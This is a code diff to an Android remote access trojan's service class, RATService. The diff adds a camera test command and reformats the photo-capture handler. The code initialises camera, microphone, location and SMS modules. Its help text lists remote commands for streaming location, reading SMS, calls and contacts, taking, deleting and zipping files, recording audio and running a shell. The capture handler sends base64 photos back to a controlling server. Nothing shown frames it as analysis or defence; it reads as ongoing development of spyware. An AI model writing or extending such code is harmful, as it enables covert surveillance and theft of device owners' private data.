@@ -82,8 +82,6 @@ public class RATService extends Service {
     
     // Modules
     private Camera2Module cameraModule;
-    //private CameraModule cameraModule;
-
     private MicModule micModule;
     private LocationModule locationModule;
     private SmsModule smsModule;
@@ -128,7 +126,6 @@ public class RATService extends Service {
         
         // Initialize modules based on config
         if (Config.ENABLE_CAMERA) cameraModule = new Camera2Module(this);
-        //if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
         if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
         if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
         if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
@@ -528,7 +525,7 @@ public class RATService extends Service {
                 break;
                 
             case "help":
-                String helpText = "Available commands: info, location, location_stream [start/stop], camera, camera_switch, camera_info, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
+                String helpText = "Available commands: info, location, location_stream [start/stop], camera, camera_switch, camera_info, test_camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
                 sendCommand("HELP|" + helpText);
                 break;
                 
@@ -556,58 +553,74 @@ public class RATService extends Service {
                 handleLocationStreamCommand(args);
                 break;
                 
-            // CAMERA COMMANDS - FIXED: Removed duplicate case
- // CAMERA COMMANDS - FIXED
-case "camera":
-case "camera_photo":
-    if (cameraModule != null) {
-        Log.d(TAG, "📸 Taking photo with camera module");
-        
-        // Use a handler to ensure we're on the right thread
-        new Handler(Looper.getMainLooper()).post(() -> {
-            cameraModule.takePhoto(new Camera2Module.CameraCallback() {
-                @Override
-                public void onPhotoTaken(String base64Image) {
-                    Log.d(TAG, "📸 Photo taken successfully, sending response");
-                    
-                    // Send response in a separate thread to avoid blocking
-                    new Thread(() -> {
-                        try {
-                            if (out != null) {
-                                out.println(base64Image);
-                                out.flush();
-                                Log.d(TAG, "📸 Camera response sent to server");
-                            } else {
-                                Log.e(TAG, "📸 Output stream is null");
-                            }
-                        } catch (Exception e) {
-                            Log.e(TAG, "Error sending camera response", e);
-                        }
-                    }).start();
+            // TEST CAMERA COMMAND - Add this for debugging
+            case "test_camera":
+                if (cameraModule != null) {
+                    sendCommand("CAMERA_TEST|Camera module exists");
+                    // Small delay to prevent mixing responses
+                    try {
+                        Thread.sleep(100);
+                    } catch (InterruptedException e) {
+                        // Ignore
+                    }
+                    String info = cameraModule.getCurrentCameraInfo();
+                    sendCommand("CAMERA_TEST|" + info);
+                } else {
+                    sendCommand("CAMERA_TEST|Camera module is NULL");
                 }
+                break;
                 
-                @Override
-                public void onError(String error) {
-                    Log.e(TAG, "📸 Camera error: " + error);
+            // CAMERA COMMANDS - FIXED
+            case "camera":
+            case "camera_photo":
+                if (cameraModule != null) {
+                    Log.d(TAG, "📸 Taking photo with camera module");
                     
-                    new Thread(() -> {
-                        try {
-                            if (out != null) {
-                                out.println("CAMERA|ERROR: " + error);
-                                out.flush();
+                    // Use a handler to ensure we're on the right thread
+                    new Handler(Looper.getMainLooper()).post(() -> {
+                        cameraModule.takePhoto(new Camera2Module.CameraCallback() {
+                            @Override
+                            public void onPhotoTaken(String base64Image) {
+                                Log.d(TAG, "📸 Photo taken successfully, sending response");
+                                
+                                // Send response in a separate thread to avoid blocking
+                                new Thread(() -> {
+                                    try {
+                                        if (out != null) {
+                                            out.println(base64Image);
+                                            out.flush();
+                                            Log.d(TAG, "📸 Camera response sent to server");
+                                        } else {
+                                            Log.e(TAG, "📸 Output stream is null");
+                                        }
+                                    } catch (Exception e) {
+                                        Log.e(TAG, "Error sending camera response", e);
+                                    }
+                                }).start();
                             }
-                        } catch (Exception e) {
-                            Log.e(TAG, "Error sending error", e);
-                        }
-                    }).start();
+                            
+                            @Override
+                            public void onError(String error) {
+                                Log.e(TAG, "📸 Camera error: " + error);
+                                
+                                new Thread(() -> {
+                                    try {
+                                        if (out != null) {
+                                            out.println("CAMERA|ERROR: " + error);
+                                            out.flush();
+                                        }
+                                    } catch (Exception e) {
+                                        Log.e(TAG, "Error sending error", e);
+                                    }
+                                }).start();
+                            }
+                        });
+                    });
+                } else {
+                    Log.e(TAG, "📸 Camera module is null");
+                    sendCommand("CAMERA|ERROR: Camera module not available");
                 }
-            });
-        });
-    } else {
-        Log.e(TAG, "📸 Camera module is null");
-        sendCommand("CAMERA|ERROR: Camera module not available");
-    }
-    break;
+                break;
                 
             case "camera_switch":
                 if (cameraModule != null) {
